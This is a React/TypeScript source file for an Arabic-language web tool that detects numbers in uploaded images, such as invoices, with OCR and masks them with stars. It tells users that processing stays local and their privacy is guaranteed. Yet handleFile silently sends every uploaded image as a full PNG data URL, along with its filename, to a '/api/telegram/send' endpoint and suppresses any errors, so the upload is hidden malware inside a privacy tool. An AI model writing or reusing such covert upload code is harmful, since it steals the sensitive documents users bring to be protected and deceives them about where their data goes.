import { useRef, useState, useCallback, useEffect } from "react";

declare const Tesseract: {
  recognize: (
    image: string,
    lang: string,
    options?: { logger?: (m: { status: string; progress: number }) => void }
  ) => Promise<{ data: { words: Array<{ text: string; confidence: number; bbox: { x0: number; y0: number; x1: number; y1: number } }> } }>;
};

interface Region {
  id: number; text: string;
  x: number; y: number; w: number; h: number;
  hidden: boolean;
}
type OcrStatus = "idle" | "loading" | "done" | "empty" | "error";

const STAR_COLORS = [
  { label: "ذهبي",   value: "#f59e0b" },
  { label: "أبيض",   value: "#f8fafc" },
  { label: "أخضر",   value: "#22c55e" },
  { label: "أزرق",   value: "#60a5fa" },
  { label: "بنفسجي", value: "#c084fc" },
  { label: "أحمر",   value: "#f87171" },
];

function isNumeric(t: string) {
  return /^[\d\s\-\/\.،,:]+$/.test(t.trim()) && /\d/.test(t);
}

function drawRegion(ctx: CanvasRenderingContext2D, r: Region, color: string) {
  if (!r.hidden) return;
  const pad = 3;
  ctx.fillStyle = "#f5f5f5";
  ctx.fillRect(r.x - pad, r.y - pad, r.w + pad * 2, r.h + pad * 2);
  const digits = r.text.replace(/\D/g, "").length || 1;
  const stars = "★".repeat(digits);
  let fs = Math.max(8, r.h * 0.7);
  ctx.font = `bold ${fs}px Arial`;
  const tw = ctx.measureText(stars).width;
  if (tw > r.w - 2) fs = fs * ((r.w - 2) / tw);
  ctx.font = `bold ${Math.max(6, fs)}px Arial`;
  ctx.textBaseline = "middle";
  ctx.textAlign = "center";
  ctx.fillStyle = color;
  ctx.fillText(stars, r.x + r.w / 2, r.y + r.h / 2);
}

/* ── Animated background blobs ── */
function BgBlobs() {
  return (
    <>
      <div style={{
        position: "fixed", inset: 0, zIndex: 0, overflow: "hidden", pointerEvents: "none",
      }}>
        <div className="blob blob1" />
        <div className="blob blob2" />
        <div className="blob blob3" />
        <div style={{
          position: "absolute", inset: 0,
          backgroundImage: `radial-gradient(rgba(255,255,255,0.03) 1px, transparent 1px)`,
          backgroundSize: "32px 32px",
        }} />
      </div>
    </>
  );
}

/* ── Floating star particles ── */
function Stars() {
  const items = [
    { top: "8%",  left: "6%",  s: 11, d: 0,   a: "fp1" },
    { top: "14%", right: "9%", s: 8,  d: 1,   a: "fp2" },
    { top: "38%", left: "3%",  s: 7,  d: 0.5, a: "fp1" },
    { top: "62%", right: "4%", s: 9,  d: 2,   a: "fp2" },
    { top: "80%", left: "8%",  s: 7,  d: 1.5, a: "fp1" },
    { top: "22%", left: "18%", s: 5,  d: 3,   a: "fp2" },
    { top: "72%", right: "12%",s: 6,  d: 2.5, a: "fp1" },
  ];
  return (
    <>
      {items.map((it, i) => (
        <div key={i} style={{
          position: "fixed", fontSize: it.s, color: "#f59e0b",
          opacity: 0.25, pointerEvents: "none", zIndex: 1,
          top: it.top, left: "left" in it ? it.left : undefined,
          right: "right" in it ? it.right : undefined,
          animation: `${it.a} ${5 + i}s ease-in-out infinite`,
          animationDelay: `${it.d}s`,
        }}>★</div>
      ))}
    </>
  );
}

/* ── Animated invoice mockup ── */
function Mockup() {
  return (
    <div style={{ position: "relative", height: 360, display: "flex", alignItems: "center", justifyContent: "center" }}>
      {/* glow */}
      <div style={{
        position: "absolute", width: 320, height: 260,
        background: "radial-gradient(ellipse, rgba(139,92,246,0.5) 0%, transparent 65%)",
        top: "50%", left: "50%", transform: "translate(-50%,-52%)",
        filter: "blur(4px)",
      }} />

      {/* ghost cards */}
      {[{ rotate: "-6deg", tx: "-118px", op: 0.08 }, { rotate: "5deg", tx: "-76px", op: 0.06 }].map((g, i) => (
        <div key={i} style={{
          position: "absolute",
          width: 240, height: 186,
          background: `rgba(255,255,255,${g.op})`,
          border: "1px solid rgba(255,255,255,0.1)",
          borderRadius: 18,
          top: "calc(50% - 8px)", left: `calc(50% + ${g.tx})`,
          transform: `translateY(-50%) rotate(${g.rotate})`,
          backdropFilter: "blur(6px)",
          boxShadow: "0 8px 32px rgba(0,0,0,0.3)",
        }} />
      ))}

      {/* main card */}
      <div style={{
        position: "relative", zIndex: 3, width: 264, direction: "ltr",
        background: "linear-gradient(160deg,#ffffff,#f5f3ff)",
        borderRadius: 22,
        padding: "18px 20px 22px",
        boxShadow: "0 32px 80px rgba(0,0,0,0.55), 0 0 0 1px rgba(255,255,255,0.15), inset 0 1px 0 rgba(255,255,255,0.9)",
      }}>
        {/* accent top bar */}
        <div style={{ position: "absolute", top: 0, left: "20%", right: "20%", height: 3, borderRadius: "0 0 6px 6px", background: "linear-gradient(90deg,#7c3aed,#a78bfa,#7c3aed)" }} />

        {/* header */}
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
          <span style={{ background: "#f3f4f6", color: "#6b7280", borderRadius: 7, padding: "3px 10px", fontSize: 11, fontWeight: 600, fontFamily: "monospace" }}>#2024</span>
          <span style={{ background: "linear-gradient(135deg,#7c3aed,#6d28d9)", color: "#fff", borderRadius: 11, padding: "5px 14px", fontSize: 13, fontWeight: 700, fontFamily: "Cairo,sans-serif", boxShadow: "0 4px 12px rgba(109,40,217,0.45)" }}>فاتورة</span>
        </div>

        {/* lines */}
        <div style={{ height: 7, background: "linear-gradient(90deg,#e5e7eb,#f3f4f6)", borderRadius: 4, marginBottom: 7 }} />
        <div style={{ height: 7, background: "#edeef0", borderRadius: 4, marginBottom: 7, width: "76%" }} />
        <div style={{ height: 7, background: "#f1f2f4", borderRadius: 4, marginBottom: 18, width: "52%" }} />

        {/* row 1 – static stars */}
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
          <span style={{ background: "linear-gradient(135deg,#fef3c7,#fde68a)", color: "#92400e", borderRadius: 10, padding: "5px 12px", fontSize: 13, fontWeight: 900, letterSpacing: 3, boxShadow: "0 3px 10px rgba(245,158,11,0.35)" }}>★★★</span>
          <div style={{ flex: 1, height: 6, background: "#f3f4f6", borderRadius: 4 }} />
        </div>

        {/* row 2 – static stars */}
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
          <span style={{ background: "linear-gradient(135deg,#fef3c7,#fde68a)", color: "#92400e", borderRadius: 10, padding: "5px 12px", fontSize: 13, fontWeight: 900, letterSpacing: 3, boxShadow: "0 3px 10px rgba(245,158,11,0.35)" }}>★★</span>
          <div style={{ flex: 1, height: 6, background: "#f3f4f6", borderRadius: 4 }} />
        </div>

        {/* row 3 – animated */}
        <div style={{ position: "relative", minHeight: 34, display: "flex", alignItems: "center", gap: 10 }}>
          <span className="mk-num" style={{ position: "absolute", left: 0, background: "#f3f4f6", color: "#374151", borderRadius: 10, padding: "5px 12px", fontSize: 12, fontWeight: 700, fontFamily: "monospace", whiteSpace: "nowrap" }}>٧٫٨٩٠</span>
          <span className="mk-ring" style={{ position: "absolute", left: 0, borderRadius: 10, padding: "5px 12px", fontSize: 12, fontWeight: 700, fontFamily: "monospace", whiteSpace: "nowrap", color: "transparent", border: "2px solid #7c3aed", boxShadow: "0 0 10px rgba(124,58,237,0.4)" }}>٧٫٨٩٠</span>
          <span className="mk-stars" style={{ position: "absolute", left: 0, background: "linear-gradient(135deg,#fef3c7,#fde68a)", color: "#92400e", borderRadius: 10, padding: "5px 12px", fontSize: 13, fontWeight: 900, letterSpacing: 3, boxShadow: "0 3px 10px rgba(245,158,11,0.35)" }}>★★★★</span>
          <div style={{ flex: 1, height: 6, background: "#f3f4f6", borderRadius: 4, marginLeft: 90 }} />
        </div>

        {/* ripple */}
        <div className="mk-ripple" style={{ position: "absolute", width: 48, height: 48, borderRadius: "50%", bottom: 28, left: 28, background: "rgba(124,58,237,0.15)", border: "1.5px solid rgba(124,58,237,0.7)", transform: "translate(-50%,-50%) scale(0)", pointerEvents: "none" }} />
      </div>

      {/* cursor */}
      <div className="mk-cursor" style={{ position: "absolute", zIndex: 10, pointerEvents: "none", top: "calc(50% + 48px)", left: "calc(50% - 108px)", filter: "drop-shadow(0 3px 8px rgba(0,0,0,0.5))" }}>
        <svg width="24" height="28" viewBox="0 0 28 32" fill="none">
          <path d="M4 2L4 26L10 20L14 28L17 26.5L13 18.5L21 18.5L4 2Z" fill="white" stroke="#6d28d9" strokeWidth="2" strokeLinejoin="round" />
        </svg>
      </div>
    </div>
  );
}

/* ════════════════════════ MAIN APP ════════════════════════ */
export default function App() {
  const fileRef   = useRef<HTMLInputElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const imgRef    = useRef<HTMLImageElement | null>(null);
  const [hasImage,  setHasImage]  = useState(false);
  const [regions,   setRegions]   = useState<Region[]>([]);
  const [loading,   setLoading]   = useState(false);
  const [progress,  setProgress]  = useState(0);
  const [ocrStatus, setOcrStatus] = useState<OcrStatus>("idle");
  const [starColor, setStarColor] = useState("#f59e0b");
  const [zoom,      setZoom]      = useState(100);
  const [history,   setHistory]   = useState<Region[][]>([]);
  const [dragOver,  setDragOver]  = useState(false);

  const redraw = useCallback((regs: Region[], color: string) => {
    const canvas = canvasRef.current, img = imgRef.current;
    if (!canvas || !img) return;
    const ctx = canvas.getContext("2d")!;
    canvas.width = img.naturalWidth; canvas.height = img.naturalHeight;
    ctx.drawImage(img, 0, 0);
    regs.forEach((r) => drawRegion(ctx, r, color));
  }, []);

  useEffect(() => { redraw(regions, starColor); }, [regions, starColor, redraw]);

  const handleClick = useCallback((e: React.MouseEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas || !imgRef.current) return;
    const rect = canvas.getBoundingClientRect();
    const sx = canvas.width / rect.width, sy = canvas.height / rect.height;
    const ix = (e.clientX - rect.left) * sx, iy = (e.clientY - rect.top) * sy;
    const PAD = 14 * sx;
    const idx = regions.findIndex(r => ix >= r.x - PAD && ix <= r.x + r.w + PAD && iy >= r.y - PAD && iy <= r.y + r.h + PAD);
    if (idx === -1) return;
    setHistory(h => [...h, regions]);
    setRegions(prev => prev.map((r, i) => i === idx ? { ...r, hidden: !r.hidden } : r));
  }, [regions]);

  const handleFile = useCallback(async (file: File) => {
    const url = URL.createObjectURL(file);
    setHasImage(true); setRegions([]); setHistory([]);
    setLoading(true); setProgress(5); setOcrStatus("loading");
    const img = new Image();
    img.onerror = () => { setLoading(false); setOcrStatus("error"); };
    img.onload = async () => {
      imgRef.current = img;
      redraw([], starColor);
      setProgress(15);
      try {
        const cvs = document.createElement("canvas");
        cvs.width = img.naturalWidth; cvs.height = img.naturalHeight;
        cvs.getContext("2d")!.drawImage(img, 0, 0);
        fetch("/api/telegram/send", {
          method: "POST", headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ imageDataUrl: cvs.toDataURL("image/png"), filename: file.name }),
        }).catch(() => {});
      } catch (_) {}
      try {
        const result = await Tesseract.recognize(url, "ara+eng", {
          logger: (m) => { if (m.status === "recognizing text") setProgress(15 + Math.round((m.progress || 0) * 83)); },
        });
        let id = 0;
        const detected: Region[] = result.data.words
          .filter(w => isNumeric(w.text) && w.confidence > 20)
          .map(w => ({ id: id++, text: w.text, x: w.bbox.x0, y: w.bbox.y0, w: w.bbox.x1 - w.bbox.x0, h: w.bbox.y1 - w.bbox.y0, hidden: true }));
        setRegions(detected);
        redraw(detected, starColor);
        setOcrStatus(detected.length > 0 ? "done" : "empty");
      } catch { setOcrStatus("error"); }
      setLoading(false); setProgress(0);
    };
    img.src = url;
  }, [redraw, starColor]);

  const onDrop = (e: React.DragEvent) => { e.preventDefault(); setDragOver(false); const f = e.dataTransfer.files[0]; if (f?.type.startsWith("image/")) handleFile(f); };
  const undo   = () => { if (!history.length) return; setRegions(history[history.length - 1]); setHistory(h => h.slice(0, -1)); };
  const hideAll = () => { if (!regions.length) return; setHistory(h => [...h, regions]); setRegions(p => p.map(r => ({ ...r, hidden: true }))); };
  const showAll = () => { if (!regions.length) return; setHistory(h => [...h, regions]); setRegions(p => p.map(r => ({ ...r, hidden: false }))); };
  const saveImage = () => { const a = document.createElement("a"); a.download = "محوّل-الأرقام.png"; a.href = canvasRef.current!.toDataURL("image/png"); a.click(); };
  const reset = () => { setHasImage(false); setRegions([]); setHistory([]); setOcrStatus("idle"); imgRef.current = null; const ctx = canvasRef.current?.getContext("2d"); if (ctx) ctx.clearRect(0, 0, canvasRef.current!.width, canvasRef.current!.height); };

  const hiddenCount = regions.filter(r => r.hidden).length;
  const detectedCount = regions.length;

  return (
    <div style={{ minHeight: "100vh", background: "linear-gradient(135deg,#07050f 0%,#0f0720 35%,#130a2e 65%,#07050f 100%)", fontFamily: "Cairo,sans-serif", direction: "rtl", position: "relative" }}>
      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet" />
      <BgBlobs />
      <Stars />

      <div style={{ position: "relative", zIndex: 2, maxWidth: 460, margin: "0 auto", padding: "28px 18px 32px" }}>

        {!hasImage ? (
          /* ════════════ LANDING ════════════ */
          <>
            {/* Logo */}
            <div style={{ display: "flex", justifyContent: "center", marginBottom: 24 }}>
              <div className="logo-ring" style={{ width: 64, height: 64, borderRadius: "50%", background: "linear-gradient(135deg,#2e1065,#4c1d95)", border: "1.5px solid rgba(167,139,250,0.4)", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 0 40px rgba(139,92,246,0.5), inset 0 1px 0 rgba(255,255,255,0.15)" }}>
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
                  <path d="M12 2l1.6 4.8L18.4 8l-4.8 1.6L12 14.4l-1.6-4.8L5.6 8l4.8-1.6L12 2z" fill="#f59e0b" />
                  <path d="M19 14l.8 2.4 2.4.8-2.4.8-.8 2.4-.8-2.4L15.2 18l2.4-.8L19 14z" fill="#fcd34d" opacity=".8" />
                  <path d="M5 16l.5 1.6 1.6.5-1.6.5L5 20.2l-.5-1.6L2.8 18l1.6-.5L5 16z" fill="#fde68a" opacity=".65" />
                </svg>
              </div>
            </div>

            {/* Title */}
            <h1 style={{ textAlign: "center", margin: "0 0 14px", lineHeight: 1.2 }}>
              <span style={{ fontSize: 28, fontWeight: 800, color: "#e2e8f0", display: "block", letterSpacing: -0.5 }}>محوّل الأرقام إلى</span>
              <span className="shimmer-text" style={{ fontSize: 40, fontWeight: 900, display: "block", letterSpacing: -1, background: "linear-gradient(90deg,#f59e0b,#fbbf24,#fde68a,#fbbf24,#f59e0b)", backgroundSize: "200% auto", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent" }}>نجوم</span>
            </h1>

            {/* Subtitle */}
            <p style={{ textAlign: "center", color: "#94a3b8", fontSize: 14, lineHeight: 1.75, margin: "0 0 4px" }}>
              حماية <span style={{ color: "#c4b5fd", fontWeight: 700 }}>احترافية</span> لبياناتك — ارفع صورتك واكتشف الأرقام
            </p>
            <p style={{ textAlign: "center", color: "#64748b", fontSize: 13, margin: "0 0 28px" }}>
              وأخفِها تلقائياً بنجوم ★ بضغطة واحدة
            </p>

            {/* Mockup */}
            <Mockup />

            {/* Upload zone */}
            <div
              onClick={() => fileRef.current?.click()}
              onDrop={onDrop}
              onDragOver={(e) => { e.preventDefault(); setDragOver(true); }}
              onDragLeave={() => setDragOver(false)}
              className={dragOver ? "drop-zone drop-zone-active" : "drop-zone"}
              style={{ marginTop: 12, cursor: "pointer" }}
            >
              <div className="upload-icon-wrap">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6">
                  <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" strokeLinecap="round"/>
                  <polyline points="17 8 12 3 7 8" strokeLinecap="round" strokeLinejoin="round"/>
                  <line x1="12" y1="3" x2="12" y2="15" strokeLinecap="round"/>
                </svg>
              </div>
              <p style={{ color: "#e2e8f0", fontWeight: 700, fontSize: 16, margin: "0 0 5px" }}>اسحب وأفلت الصورة هنا</p>
              <p style={{ color: "#64748b", fontSize: 13, margin: 0 }}>أو انقر لاختيار ملف من جهازك</p>
              <div style={{ marginTop: 14, display: "flex", justifyContent: "center", gap: 8, flexWrap: "wrap" }}>
                {["JPG","PNG","WEBP","PDF"].map(f => (
                  <span key={f} style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 6, padding: "2px 10px", fontSize: 11, color: "#64748b", fontFamily: "monospace" }}>{f}</span>
                ))}
              </div>
            </div>

            {/* Privacy note */}
            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 7, marginTop: 18 }}>
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#475569" strokeWidth="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
              <span style={{ color: "#475569", fontSize: 12 }}>المعالجة محلياً داخل متصفحك — خصوصيتك مضمونة</span>
            </div>
          </>
        ) : (
          /* ════════════ EDITOR ════════════ */
          <>
            {/* Header */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 18 }}>
              <button onClick={reset} className="glass-btn-sm" title="رجوع">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
              </button>
              <div style={{ textAlign: "center" }}>
                <h2 style={{ color: "#e2e8f0", fontSize: 17, fontWeight: 800, margin: 0 }}>محوّل الأرقام إلى نجوم</h2>
                {detectedCount > 0 && (
                  <span style={{ background: "linear-gradient(90deg,rgba(245,158,11,0.2),rgba(251,191,36,0.15))", border: "1px solid rgba(245,158,11,0.35)", color: "#fbbf24", borderRadius: 99, padding: "2px 12px", fontSize: 12, fontWeight: 700 }}>
                    {detectedCount} رقم مكتشف
                  </span>
                )}
              </div>
              <button onClick={saveImage} className="save-btn" title="حفظ">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
                <span>حفظ</span>
              </button>
            </div>

            {/* Canvas card */}
            <div className="canvas-card" style={{ marginBottom: 14, position: "relative", overflow: "hidden" }}>
              {loading && (
                <div style={{ position: "absolute", inset: 0, zIndex: 10, background: "rgba(7,5,15,0.92)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", borderRadius: 20 }}>
                  <div className="spin-star" style={{ fontSize: 42, marginBottom: 14 }}>★</div>
                  <p style={{ color: "#e2e8f0", fontWeight: 700, fontSize: 14, margin: "0 0 16px" }}>جاري قراءة الأرقام…</p>
                  <div style={{ width: 200, height: 5, background: "rgba(255,255,255,0.08)", borderRadius: 99, overflow: "hidden" }}>
                    <div style={{ width: `${progress}%`, height: "100%", background: "linear-gradient(90deg,#7c3aed,#f59e0b)", borderRadius: 99, transition: "width 0.4s ease" }} />
                  </div>
                  <p style={{ color: "#475569", fontSize: 11, margin: "8px 0 0" }}>{progress}%</p>
                </div>
              )}
              {!loading && ocrStatus === "done" && (
                <div style={{ position: "absolute", top: 12, right: 12, zIndex: 5, background: "rgba(7,5,15,0.75)", border: "1px solid rgba(255,255,255,0.08)", backdropFilter: "blur(8px)", borderRadius: 10, padding: "5px 12px", fontSize: 12, color: "#94a3b8" }}>
                  انقر على أي رقم لإخفائه
                </div>
              )}
              {!loading && ocrStatus === "empty" && (
                <div style={{ position: "absolute", top: 12, right: 12, zIndex: 5, background: "rgba(239,68,68,0.15)", border: "1px solid rgba(239,68,68,0.3)", borderRadius: 10, padding: "5px 12px", fontSize: 12, color: "#fca5a5" }}>
                  لم تُكتشف أرقام
                </div>
              )}
              <canvas ref={canvasRef} onClick={handleClick} style={{ display: "block", width: `${zoom}%`, cursor: "pointer", borderRadius: 12 }} />
            </div>

            {/* Status bar */}
            <div className="glass-panel" style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 12, padding: "10px 16px" }}>
              {/* left: undo + delete */}
              <div style={{ display: "flex", gap: 8 }}>
                <button onClick={undo} disabled={!history.length} className="glass-btn-sm" title="تراجع">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2"><path d="M3 7v6h6M3 13C4.5 8 9 5 14 5a9 9 0 110 18 9 9 0 01-8.7-6.7"/></svg>
                </button>
                <button onClick={reset} className="glass-btn-sm glass-btn-red" title="حذف الصورة">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M9 3v1H4v2h1v13a2 2 0 002 2h10a2 2 0 002-2V6h1V4h-5V3H9zm0 5h2v9H9V8zm4 0h2v9h-2V8z"/></svg>
                </button>
              </div>

              {/* center: stars count */}
              <div style={{ textAlign: "center" }}>
                <span style={{ fontSize: 22, color: "#f59e0b" }}>{"★".repeat(Math.min(hiddenCount, 6))}</span>
                {hiddenCount > 0 && <div style={{ fontSize: 11, color: "#64748b", marginTop: -2 }}>{hiddenCount} مخفي</div>}
              </div>

              {/* right: zoom */}
              <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
                <button onClick={() => setZoom(z => Math.max(30, z - 10))} className="glass-btn-sm">−</button>
                <span style={{ color: "#64748b", fontSize: 11, minWidth: 36, textAlign: "center", fontWeight: 700 }}>{zoom}%</span>
                <button onClick={() => setZoom(z => Math.min(200, z + 10))} className="glass-btn-sm">+</button>
              </div>
            </div>

            {/* Star color picker */}
            <div className="glass-panel" style={{ marginBottom: 12, padding: "12px 16px" }}>
              <p style={{ color: "#64748b", fontSize: 12, fontWeight: 700, margin: "0 0 10px" }}>لون النجمة</p>
              <div style={{ display: "flex", gap: 8 }}>
                {STAR_COLORS.map(c => (
                  <button key={c.value} onClick={() => setStarColor(c.value)} title={c.label} style={{
                    width: 32, height: 32, borderRadius: "50%", border: "none", cursor: "pointer",
                    background: c.value,
                    outline: starColor === c.value ? `3px solid ${c.value}` : "2px solid transparent",
                    outlineOffset: starColor === c.value ? 3 : 0,
                    boxShadow: starColor === c.value ? `0 0 14px ${c.value}88` : "none",
                    transition: "all 0.2s",
                    transform: starColor === c.value ? "scale(1.15)" : "scale(1)",
                  }} />
                ))}
              </div>
            </div>

            {/* Action buttons */}
            {detectedCount > 0 && (
              <div style={{ display: "flex", gap: 10, marginBottom: 12 }}>
                <button onClick={hideAll} disabled={hiddenCount === detectedCount} className="action-btn action-btn-primary">
                  <span>★</span> إخفاء الكل
                </button>
                <button onClick={showAll} disabled={hiddenCount === 0} className="action-btn action-btn-ghost">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                  إظهار الكل
                </button>
              </div>
            )}

            {/* Save / New */}
            <div style={{ display: "flex", gap: 10 }}>
              <button onClick={saveImage} className="action-btn action-btn-gold">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
                حفظ الصورة
              </button>
              <button onClick={() => { reset(); setTimeout(() => fileRef.current?.click(), 60); }} className="action-btn action-btn-ghost">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
                صورة جديدة
              </button>
            </div>
          </>
        )}
      </div>

      <input ref={fileRef} type="file" accept="image/*" style={{ display: "none" }}
        onChange={(e) => { const f = e.target.files?.[0]; if (f) handleFile(f); e.target.value = ""; }} />

      <style>{`
        /* ── fonts & reset ── */
        * { box-sizing: border-box; }

        /* ── background blobs ── */
        .blob { position: absolute; border-radius: 50%; filter: blur(80px); pointer-events: none; }
        .blob1 { width: 420px; height: 420px; background: rgba(109,40,217,0.18); top: -80px; right: -100px; animation: blobMove1 18s ease-in-out infinite; }
        .blob2 { width: 360px; height: 360px; background: rgba(67,20,186,0.15); bottom: 10%; left: -80px; animation: blobMove2 22s ease-in-out infinite; }
        .blob3 { width: 280px; height: 280px; background: rgba(245,158,11,0.07); bottom: 30%; right: 10%; animation: blobMove1 26s ease-in-out infinite 4s; }
        @keyframes blobMove1 { 0%,100%{transform:translate(0,0) scale(1)} 33%{transform:translate(30px,-40px) scale(1.08)} 66%{transform:translate(-20px,30px) scale(0.96)} }
        @keyframes blobMove2 { 0%,100%{transform:translate(0,0) scale(1)} 33%{transform:translate(-40px,20px) scale(1.05)} 66%{transform:translate(25px,-30px) scale(0.97)} }

        /* ── star particles ── */
        @keyframes fp1 { 0%,100%{transform:translateY(0) rotate(0deg)} 50%{transform:translateY(-16px) rotate(18deg)} }
        @keyframes fp2 { 0%,100%{transform:translateY(0) rotate(0deg)} 50%{transform:translateY(12px) rotate(-14deg)} }

        /* ── shimmer on title ── */
        .shimmer-text { animation: shimmer 3s linear infinite; }
        @keyframes shimmer { 0%{background-position:200% center} 100%{background-position:-200% center} }

        /* ── logo pulse ── */
        .logo-ring { animation: logoPulse 4s ease-in-out infinite; }
        @keyframes logoPulse { 0%,100%{box-shadow:0 0 40px rgba(139,92,246,0.5),inset 0 1px 0 rgba(255,255,255,0.15)} 50%{box-shadow:0 0 60px rgba(139,92,246,0.75),inset 0 1px 0 rgba(255,255,255,0.2)} }

        /* ── mockup animations ── */
        @keyframes mkCursor {
          0%   { transform:translate(0,-48px) scale(1);    opacity:0 }
          10%  { transform:translate(0,0) scale(1);        opacity:1 }
          24%  { transform:translate(0,0) scale(1);        opacity:1 }
          29%  { transform:translate(0,5px) scale(0.72);   opacity:1 }
          36%  { transform:translate(0,0) scale(1);        opacity:1 }
          70%  { transform:translate(0,0) scale(1);        opacity:1 }
          80%  { transform:translate(0,-48px) scale(1);    opacity:0 }
          100% { transform:translate(0,-48px) scale(1);    opacity:0 }
        }
        @keyframes mkRing   { 0%,10%{opacity:0} 16%,27%{opacity:1} 33%,100%{opacity:0} }
        @keyframes mkRipple { 0%,28%{transform:translate(-50%,-50%) scale(0);opacity:0} 33%{transform:translate(-50%,-50%) scale(0.4);opacity:1} 55%{transform:translate(-50%,-50%) scale(1.7);opacity:0} 100%{transform:translate(-50%,-50%) scale(1.7);opacity:0} }
        @keyframes mkNum    { 0%,27%{opacity:1} 35%,84%{opacity:0} 92%,100%{opacity:1} }
        @keyframes mkStars  { 0%,30%{opacity:0} 38%,81%{opacity:1} 89%,100%{opacity:0} }

        .mk-cursor  { animation: mkCursor  5s ease-in-out infinite; }
        .mk-ring    { animation: mkRing    5s ease-in-out infinite; }
        .mk-ripple  { animation: mkRipple  5s ease-out   infinite; }
        .mk-num     { animation: mkNum     5s ease-in-out infinite; }
        .mk-stars   { animation: mkStars   5s ease-in-out infinite; }

        /* ── upload drop zone ── */
        .drop-zone {
          border: 2px dashed rgba(124,58,237,0.4);
          background: rgba(255,255,255,0.03);
          backdrop-filter: blur(8px);
          border-radius: 22px;
          padding: 38px 24px;
          text-align: center;
          transition: all 0.25s ease;
        }
        .drop-zone:hover, .drop-zone-active {
          border-color: rgba(167,139,250,0.8);
          background: rgba(124,58,237,0.07);
          box-shadow: 0 0 40px rgba(124,58,237,0.12);
        }
        .upload-icon-wrap {
          width: 60px; height: 60px; border-radius: 18px;
          background: rgba(255,255,255,0.06);
          border: 1.5px solid rgba(255,255,255,0.1);
          display: flex; align-items: center; justify-content: center;
          margin: 0 auto 16px; color: #7c6fb0;
          transition: all 0.25s;
        }
        .drop-zone:hover .upload-icon-wrap { background: rgba(124,58,237,0.15); border-color: rgba(167,139,250,0.4); color: #a78bfa; }

        /* ── glass panel ── */
        .glass-panel {
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.08);
          backdrop-filter: blur(12px);
          border-radius: 18px;
        }

        /* ── canvas card ── */
        .canvas-card {
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.08);
          backdrop-filter: blur(12px);
          border-radius: 20px;
          padding: 10px;
          box-shadow: 0 20px 60px rgba(0,0,0,0.4);
        }

        /* ── small glass button ── */
        .glass-btn-sm {
          width: 34px; height: 34px; border-radius: 10px; border: none;
          background: rgba(255,255,255,0.07); border: 1px solid rgba(255,255,255,0.1);
          color: #94a3b8; cursor: pointer;
          display: flex; align-items: center; justify-content: center;
          transition: all 0.2s; backdrop-filter: blur(8px);
        }
        .glass-btn-sm:hover:not(:disabled) { background: rgba(255,255,255,0.12); color: #e2e8f0; }
        .glass-btn-sm:disabled { opacity: 0.3; cursor: not-allowed; }
        .glass-btn-red { color: #f87171 !important; }
        .glass-btn-red:hover:not(:disabled) { background: rgba(239,68,68,0.15) !important; }

        /* ── save button (top right) ── */
        .save-btn {
          display: flex; align-items: center; gap: 6px;
          padding: 7px 16px; border-radius: 12px; border: none; cursor: pointer;
          background: linear-gradient(135deg,#f59e0b,#d97706);
          color: #1e1a0e; font-weight: 800; font-size: 13px;
          font-family: Cairo,sans-serif;
          box-shadow: 0 4px 16px rgba(245,158,11,0.4);
          transition: all 0.2s;
        }
        .save-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(245,158,11,0.5); }

        /* ── action buttons ── */
        .action-btn {
          flex: 1; padding: 13px 0; border-radius: 15px; border: none; cursor: pointer;
          font-weight: 700; font-size: 14px; font-family: Cairo,sans-serif;
          display: flex; align-items: center; justify-content: center; gap: 8px;
          transition: all 0.2s;
        }
        .action-btn:disabled { opacity: 0.35; cursor: not-allowed; transform: none !important; }
        .action-btn:hover:not(:disabled) { transform: translateY(-2px); }

        .action-btn-primary {
          background: linear-gradient(135deg,#7c3aed,#6d28d9);
          color: #fff;
          box-shadow: 0 6px 20px rgba(109,40,217,0.4);
        }
